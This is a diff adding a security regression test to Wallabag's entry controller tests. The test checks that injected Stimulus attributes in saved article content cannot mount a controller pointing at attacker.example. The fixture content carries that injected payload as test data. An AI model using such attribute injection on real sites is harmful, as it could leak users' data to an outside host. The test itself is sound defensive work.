@@ -857,6 +857,26 @@ class EntryControllerTest extends WallabagTestCase
         $this->assertStringEndsWith('/archive/list', $client->getResponse()->headers->get('Location'));
     }
 
+    public function testViewDoesNotMountControllersFromEntryContent(): void
+    {
+        $this->logInAs('admin');
+        $client = $this->getTestClient();
+
+        $entry = new Entry($this->getLoggedInUser());
+        $entry->setUrl('http://example.com/stimulus');
+        $entry->setTitle('title stimulus');
+        $entry->setContent('<div data-controller="annotations" data-annotations-search-url-value="http://attacker.example/c"><p>foo bar baz</p></div>');
+        $this->getEntityManager()->persist($entry);
+        $this->getEntityManager()->flush();
+
+        $crawler = $client->request('GET', '/view/' . $entry->getId());
+
+        $this->assertSame(200, $client->getResponse()->getStatusCode());
+        $this->assertCount(1, $crawler->filter('[data-controller~="annotations"]'));
+        $this->assertStringNotContainsString('attacker.example', $client->getResponse()->getContent());
+        $this->assertStringContainsString('foo bar baz', $client->getResponse()->getContent());
+    }
+
     public function testViewOtherUserEntry(): void
     {
         $this->logInAs('admin');
